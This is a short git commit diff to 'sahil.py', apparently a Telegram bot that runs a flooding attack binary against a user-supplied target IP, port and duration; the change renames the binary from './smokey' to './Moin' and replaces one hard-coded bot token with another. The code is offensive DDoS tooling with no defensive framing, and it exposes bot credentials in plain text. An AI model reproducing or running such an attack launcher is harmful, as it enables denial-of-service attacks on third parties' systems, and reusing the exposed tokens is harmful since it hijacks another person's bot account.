2accf31ddb89a3584cde4acba00d913787aa1c15
badal006 <bhaigundahaimarea@gmail.com>
2025-04-29 00:31:35 +0530

    Update sahil.py

--- sahil.py
+++ sahil.py
@@ -11,7 +11,7 @@ from threading import Thread
 loop = asyncio.get_event_loop()
 
 # Bot token
-TOKEN = '7327182448:AAGyikpgIKjKF6WQKrY1Y8xF62wFmosvCws'
+TOKEN = '7327182448:AAHTi3bnXOvV54QGnlhIwdYW-D8RsSGFXIU'
 bot = telebot.TeleBot(TOKEN)
 REQUEST_INTERVAL = 1
 
@@ -31,7 +31,7 @@ CREATOR = "This File Is Made By @SahilModzOwner"  #DON'T CHANGE THIS WARNA ERROR
 
 # Async function to run attack command
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./smokey {target_ip} {target_port} {duration} 1450"
+    command = f"./Moin {target_ip} {target_port} {duration} 1450"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
